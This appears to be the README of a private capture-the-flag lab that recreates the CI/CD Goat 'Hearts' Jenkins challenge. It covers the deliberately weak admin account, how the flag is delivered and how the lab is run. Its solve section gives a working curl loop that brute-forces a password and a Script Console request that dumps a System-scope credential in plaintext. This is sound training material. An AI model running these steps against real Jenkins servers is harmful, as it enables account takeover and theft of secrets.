# Hearts: inadequate identity & access management (CyberCTF lab)

A bespoke, self-contained reproduction of the **Hearts** challenge from
[CI/CD Goat](https://github.com/cider-security-research/cicd-goat) — OWASP **CICD-SEC-2, Inadequate
Identity and Access Management**. Wonderland's **Jenkins** controller is backed by its own user
database, which has no protection against password guessing. The agents administrator, `knave`, is a
**privileged** account (Overall/Administer) that carries a **weak, guessable password** (`rockme`).
An attacker brute-forces it against a common-password wordlist, logs in, and uses that privileged
access to read a **System-scope** credential (`prod-deploy`) straight from the **Script Console** — a
credential no pipeline can bind. The credential's secret is the flag.

**Private lab content — do not copy into any public repository.**

## Infrastructure

One machine — the minimum this attack needs:

| Machine | What |
|---|---|
| `jenkins` | Jenkins controller, configured by Configuration-as-Code. The security realm is Jenkins' own user database (signup off, **no** lockout or rate limiting). Matrix authorization: `alice` has only `Overall/Read`; `knave` has `Overall/Administer`. `prod-deploy` is a **System-scope** username/password credential whose secret is the per-player flag. `curl` is present for the in-machine solver. Runs as root to read the mounted per-player secret. |

No Gitea, GitLab, prod box or SSH agents — only what this one vulnerability needs. The web port
listens on container `8080`; the host port is assigned dynamically by the runner (see below). Jenkins
is slow to boot — allow a few minutes.

## Objective

One per-player objective (`.ctf/objectives.json`), graded by CyberBackend:

| Key | Evidence | What the player recovers |
|---|---|---|
| `hearts` | `SECRET` (`%s`) | The System-scope `prod-deploy` credential's secret, exfiltrated from the Jenkins credential store |

Intended path: on `alice`'s account, read People and find `knave` is the agents admin (privileged) →
brute-force `knave`'s weak password against a common-password list (`rockme`) → log in as `knave` →
from `Manage Jenkins » Script Console`, read the System-scope `prod-deploy` credential with
`SystemCredentialsProvider...find { it.id == 'prod-deploy' }.password.getPlainText()`. The recovered
secret is the flag. (A System-scope credential cannot be bound by a pipeline — only a privileged user
can read it — which is why the privileged, weak-password account matters; see UPSTREAM.md.)

## Per-player flag

The flag is issued per player by CyberCTF and handed to the lab by the launcher as a **file**
(`isoloom.yml` `inputs: [CTF_FLAG_HEARTS]`, delivered via
`files: [{ path: /run/lab/secrets/hearts, input: CTF_FLAG_HEARTS }]` on the Jenkins machine), never
an environment variable, so it never appears in `docker inspect`, an image layer or a generated file.
The Jenkins entrypoint stages the file into the directory JCasC reads file secrets from, so
`prod-deploy` (`password: "${hearts}"`) resolves at boot **into the credential store only** — a
privileged user must read the credential, exactly as in the challenge.

An **offline start** (local, CI) leaves the input empty, and the lab stages its development
placeholder (`.ctf/objectives.json` `dev`) instead, so it still comes up and is solvable without a
launcher.

## Dynamic ports

The web service declares `ports: { web: { port: 8080, protocol: http, publish: true } }`.
`publish: true` asks the runner for a **free host port it picks at `up` time** — there is no fixed
host port anywhere in the spec, message, configs or checks (the only literals are in-container
loopback and the lab network CIDR). The `message` reads the real URL back through
`{{ machines.jenkins.ports.web.url }}`.

## Run it

Described once in [`isoloom.yml`](isoloom.yml) ([Isoloom](https://www.isoloom.com)); run on Docker
through the [Isothrum](https://www.isothrum.com) runner:

```bash
isoloom validate .
isoloom generate . --target docker
isothrum up . --target docker          # add --secret-from-env CTF_FLAG_HEARTS for a real value
isothrum check . --target docker       # Jenkins is slow; the solver waits, brute-forces and exfiltrates
isothrum down . --target docker
```

Solve it the way the check does:

```bash
# 1. brute-force knave's password (rockyou-style list; rockme authenticates)
for p in $(cat wordlist); do
  curl -s -u "knave:$p" http://<jenkins-url>/whoAmI/api/json | grep -q '"name":"knave"' && echo "knave:$p" && break
done
# 2. read the System-scope credential from the Script Console as knave
crumb=$(curl -s -u knave:rockme 'http://<jenkins-url>/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,":",//crumb)')
curl -s -u knave:rockme -H "$crumb" --data-urlencode \
  "script=println com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance().getCredentials().find{it.id=='prod-deploy'}.password.getPlainText()" \
  http://<jenkins-url>/scriptText           # the printed value is the flag
```

## Layout

- `build/jenkins/Dockerfile` — Jenkins LTS + plugins, runs as root to read the mounted secret
- `build/jenkins/casc/jenkins.yaml` — Configuration-as-Code: the user database (weak `knave`), matrix authorization, the System-scope `prod-deploy` credential
- `build/jenkins/wordlist.txt` — the bundled rockyou-style wordlist the brute-force runs against (`rockme` is in it)
- `build/jenkins/entrypoint.sh` — stages the per-player flag into the JCasC file-secret directory
- `build/jenkins/solve.sh` — the solver / self-check (`/usr/local/bin/hearts-solve`): brute-forces knave and exfiltrates the credential, never printing the flag
- `.ctf/` — `metadata.json` and `objectives.json` (the catalogue registration)
- `UPSTREAM.md` — attribution, and the two faithful deviations (the exfiltration primitive)
- `.isoloom/` — generated by `isoloom generate` (git-ignored; don't edit)
